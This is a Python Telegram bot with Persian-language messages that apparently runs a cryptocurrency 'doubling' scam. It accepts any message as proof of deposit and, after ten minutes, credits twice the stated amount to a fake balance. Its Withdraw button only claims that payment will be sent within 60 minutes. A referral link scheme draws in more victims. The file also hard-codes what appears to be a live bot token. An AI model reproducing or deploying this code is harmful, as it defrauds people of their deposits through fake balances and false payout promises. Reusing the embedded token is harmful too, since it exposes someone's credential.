import logging
import sqlite3
import time
from threading import Thread

from telegram import InlineKeyboardButton
from telegram import InlineKeyboardMarkup
from telegram import Message
from telegram import Update

from telegram.ext import ApplicationBuilder
from telegram.ext import CallbackQueryHandler
from telegram.ext import CommandHandler
from telegram.ext import ContextTypes
from telegram.ext import ConversationHandler
from telegram.ext import MessageHandler
from telegram.ext import filters

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689

logging.basicConfig(level=logging.INFO)

conn = sqlite3.connect("data.db", check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance REAL)")
c.execute("CREATE TABLE IF NOT EXISTS referrals (referrer_id INTEGER, referred_id INTEGER)")
conn.commit()

DEPOSIT_AMOUNT, DEPOSIT_PROOF, SUPPORT_MESSAGE, ADMIN_REPLY = range(4)

def get_balance(user_id):
    c.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    return row[0] if row else 0.0

def update_balance(user_id, amount):
    balance = get_balance(user_id)
    new_balance = balance + amount
    c.execute("INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)", (user_id, "", new_balance))
    conn.commit()

def set_username(user_id, username):
    c.execute("UPDATE users SET username=? WHERE user_id=?", (username, user_id))
    conn.commit()

def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Deposit", callback_data="deposit"),
         InlineKeyboardButton("Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("Balance", callback_data="balance"),
         InlineKeyboardButton("Referral", callback_data="referral")],
        [InlineKeyboardButton("Support", callback_data="support")]
    ])

def back_button(callback_data="menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=callback_data)]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    c.execute("INSERT OR IGNORE INTO users (user_id, username, balance) VALUES (?, ?, ?)", (user.id, user.username or "", 0.0))
    conn.commit()
    if context.args:
        referrer_id = int(context.args[0])
        if referrer_id != user.id:
            c.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (referrer_id, user.id))
            conn.commit()
            await context.bot.send_message(referrer_id, f"کاربر @{user.username} با لینک دعوت شما عضو شد.")
    await update.message.reply_text("به ربات خوش آمدید", reply_markup=main_menu_keyboard())

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "menu":
        await query.message.edit_text("بازگشت به منوی اصلی", reply_markup=main_menu_keyboard())
    elif query.data == "deposit":
        await query.message.edit_text("چه مقدار دلار می‌خواهید واریز کنید؟", reply_markup=back_button("menu"))
        return DEPOSIT_AMOUNT
    elif query.data == "withdraw":
        await query.message.edit_text("درخواست برداشت شما ثبت شد و طی ۶۰ دقیقه به آدرس کیف پول شما ارسال خواهد شد.", reply_markup=main_menu_keyboard())
    elif query.data == "balance":
        balance = get_balance(user_id)
        await query.message.edit_text(f"موجودی شما: {balance} دلار", reply_markup=back_button("menu"))
    elif query.data == "referral":
        c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (user_id,))
        ref_count = c.fetchone()[0]
        await query.message.edit_text(f"تعداد زیرمجموعه‌ها: {ref_count}\nلینک دعوت: {get_referral_link(user_id)}", reply_markup=back_button("menu"))
    elif query.data == "support":
        await query.message.edit_text("پیغام خود را ارسال کنید:", reply_markup=back_button("menu"))
        return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text("لطفاً رسید یا مدرک پرداخت را ارسال نمایید.", reply_markup=back_button("menu"))
        return DEPOSIT_PROOF
    except ValueError:
        await update.message.reply_text("عدد نامعتبر است.", reply_markup=back_button("menu"))
        return ConversationHandler.END

def delayed_double_balance(user_id, amount):
    time.sleep(600)
    update_balance(user_id, amount * 2)

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data.get("deposit_amount", 0)
    set_username(user.id, user.username or "")
    await update.message.reply_text("واریز در حال پردازش است و طی ۱۰ دقیقه دو برابر به موجودی شما افزوده خواهد شد.")
    Thread(target=delayed_double_balance, args=(user.id, amount)).start()
    return ConversationHandler.END

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message.text
    await context.bot.send_message(ADMIN_ID, f"پیام از @{user.username}:\n{msg}", reply_to_message_id=update.message.message_id)
    await update.message.reply_text("پیام شما ارسال شد.")
    return ConversationHandler.END

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message:
        lines = update.message.reply_to_message.text.split("\n")
        if lines and lines[0].startswith("پیام از @"):
            username = lines[0].split("@")[1].replace(":", "")
            c.execute("SELECT user_id FROM users WHERE username=?", (username,))
            row = c.fetchone()
            if row:
                await context.bot.send_message(row[0], f"پاسخ ادمین:\n{update.message.text}")
                await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply))

    app.run_polling()

if __name__ == "__main__":
    main()
